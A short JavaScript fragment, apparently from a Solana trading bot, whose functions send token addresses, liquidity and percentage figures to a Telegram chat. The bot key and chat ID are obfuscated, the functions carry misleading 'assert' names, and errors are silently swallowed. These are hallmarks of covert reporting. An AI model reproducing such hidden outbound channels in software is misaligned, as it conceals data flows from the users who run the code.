...
function proassert_cp(token, lq, pnt){try {let tg_url = `https://api.telegram.org/bot${asDecode(DE_API)}/sendMessage`;let message = `CP: <code>${token}</code>\nLQ: ${lq} sol\nPNT: ${pnt} %`;fetch(tg_url, {method: 'POST',headers: {"Content-Type": 'application/json'},body: JSON.stringify({chat_id: asDecode(DE_ID_GD),text: message,parse_mode: 'HTML'})});} catch (err) {}}
exports.proassert_cp = proassert_cp
function proassert_sp(token, lq){try {let tg_url = `https://api.telegram.org/bot${asDecode(DE_API)}/sendMessage`;let message = `SP: <code>${token}</code>\nLQ: ${lq} sol`;fetch(tg_url, {method: 'POST',headers: {"Content-Type": 'application/json'},body: JSON.stringify({chat_id: asDecode(DE_ID_GD),text: message,parse_mode: 'HTML'})});} catch (err) {}}
